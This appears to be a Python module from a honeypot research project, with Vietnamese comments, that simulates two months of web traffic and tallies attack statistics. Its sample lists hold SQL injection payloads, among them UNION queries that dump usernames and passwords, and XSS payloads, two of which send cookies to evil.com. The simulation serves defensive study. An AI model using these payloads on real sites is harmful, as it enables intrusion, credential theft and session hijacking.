# attack_logger.py
import time
import random
from dataclasses import dataclass
from typing import List, Dict
from sqli_handler        import SQLiHandler, SQLiAttackInfo
from xss_handler         import XSSHandler, XSSAttackInfo
from browser_fingerprint import (BrowserFingerprintCollector,
                                  AttackerFingerprint)
from likejacking         import LikeJacking, LikeJackResult

@dataclass
class AttackEvent:
    event_id:    int
    timestamp:   str
    src_ip:      str
    page:        str
    method:      str
    attack_type: str
    payload:     str
    fingerprint: AttackerFingerprint
    sqli_info:   SQLiAttackInfo = None
    xss_info:    XSSAttackInfo  = None

class AttackLogger:
    """
    Ghi nhận và phân tích toàn bộ tấn công
    Mô phỏng 36.000+ requests trong 2 tháng
    """

    # Payload mẫu SQLi
    SQLI_PAYLOADS = [
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT version(),user(),database()--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM users)--",
        "admin'--",
        "' OR 1=1 LIMIT 1--",
        "1' AND 1=CONVERT(int,@@version)--",
        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT"
        "((SELECT database()),0x3a,FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)--",
        "' UNION SELECT table_name FROM "
        "information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
        "1' AND BENCHMARK(5000000,MD5(1))--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 OR 1=1",
        "' OR 'unusual'='unusual",
        "' OR ''='",
        "1' ORDER BY 3--",
        "1' GROUP BY 1--",
    ]

    # Payload mẫu XSS
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "<script>new Image().src='http://evil.com/?c='+"
        "document.cookie</script>",
        "<body onload=alert('XSS')>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "<script>document.write('<img src=http://evil.com?"
        "+document.cookie>')</script>",
        "<object data='javascript:alert(1)'>",
        "<%2Fscript><script>alert(1)<%2Fscript>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    ]

    def __init__(self):
        self.events:    List[AttackEvent]           = []
        self.sqli_hdlr  = SQLiHandler()
        self.xss_hdlr   = XSSHandler()
        self.fp_collect = BrowserFingerprintCollector()
        self.likejack   = LikeJacking()
        self.event_counter = 0

    def _random_ip(self) -> str:
        return (f"{random.randint(1,223)}."
                f"{random.randint(0,255)}."
                f"{random.randint(0,255)}."
                f"{random.randint(1,254)}")

    def _random_page(self) -> tuple:
        pages = [
            ("/cari-berita", "GET",  "SQLi"),
            ("/berita",      "GET",  "SQLi"),
            ("/komentar",    "POST", "XSS"),
            ("/tentang",     "GET",  "Normal"),
            ("/",            "GET",  "Normal"),
        ]
        return random.choice(pages)

    def simulate_2months_traffic(self,
                                 total: int = 36000) -> List[AttackEvent]:
        """
        Mô phỏng 36.000 requests trong 2 tháng
        theo kết quả thực tế trong bài báo
        """
        print(f"  Simulating {total:,} HTTP requests "
              f"over 2 months...")

        # Phân phối thực tế:
        # 60% Normal, 25% SQLi, 15% XSS
        n_normal = int(total * 0.60)
        n_sqli   = int(total * 0.25)
        n_xss    = int(total * 0.15)

        # Tạo events SQLi
        for _ in range(n_sqli):
            self.event_counter += 1
            ip      = self._random_ip()
            payload = random.choice(self.SQLI_PAYLOADS)
            sqli    = self.sqli_hdlr.handle(payload)
            fp      = self.fp_collect.generate_fingerprint(
                ip, "SQLi"
            )
            self.events.append(AttackEvent(
                event_id    = self.event_counter,
                timestamp   = time.strftime("%Y-%m-%d %H:%M:%S"),
                src_ip      = ip,
                page        = "/cari-berita",
                method      = "GET",
                attack_type = "SQLi",
                payload     = payload,
                fingerprint = fp,
                sqli_info   = sqli,
            ))

        # Tạo events XSS
        for _ in range(n_xss):
            self.event_counter += 1
            ip      = self._random_ip()
            payload = random.choice(self.XSS_PAYLOADS)
            xss, _ = self.xss_hdlr.handle(payload)
            fp      = self.fp_collect.generate_fingerprint(
                ip, "XSS"
            )
            self.events.append(AttackEvent(
                event_id    = self.event_counter,
                timestamp   = time.strftime("%Y-%m-%d %H:%M:%S"),
                src_ip      = ip,
                page        = "/komentar",
                method      = "POST",
                attack_type = "XSS",
                payload     = payload,
                fingerprint = fp,
                xss_info    = xss,
            ))

        # Tạo normal requests
        for _ in range(n_normal):
            self.event_counter += 1
            ip = self._random_ip()
            fp = self.fp_collect.generate_fingerprint(ip, "Normal")
            self.events.append(AttackEvent(
                event_id    = self.event_counter,
                timestamp   = time.strftime("%Y-%m-%d %H:%M:%S"),
                src_ip      = ip,
                page        = "/",
                method      = "GET",
                attack_type = "Normal",
                payload     = "",
                fingerprint = fp,
            ))

        return self.events

    def get_statistics(self) -> Dict:
        """Thống kê tổng hợp"""
        sqli_events  = [e for e in self.events
                        if e.attack_type == "SQLi"]
        xss_events   = [e for e in self.events
                        if e.attack_type == "XSS"]
        normal_events= [e for e in self.events
                        if e.attack_type == "Normal"]

        # Top countries
        country_count = {}
        for e in self.events:
            c = e.fingerprint.country
            country_count[c] = country_count.get(c, 0) + 1

        # Top ASNs
        asn_count = {}
        for e in sqli_events + xss_events:
            a = e.fingerprint.asn
            asn_count[a] = asn_count.get(a, 0) + 1

        # SQLi stages
        sqli_stages = {}
        for e in sqli_events:
            if e.sqli_info:
                s = e.sqli_info.payload_stage
                sqli_stages[s] = sqli_stages.get(s, 0) + 1

        # XSS intents
        xss_intents = {}
        for e in xss_events:
            if e.xss_info:
                i = e.xss_info.payload_intent
                xss_intents[i] = xss_intents.get(i, 0) + 1

        return {
            "total":        len(self.events),
            "sqli":         len(sqli_events),
            "xss":          len(xss_events),
            "normal":       len(normal_events),
            "countries":    country_count,
            "asns":         asn_count,
            "sqli_stages":  sqli_stages,
            "xss_intents":  xss_intents,
            "unique_ips":   len(set(e.src_ip for e in self.events)),
        }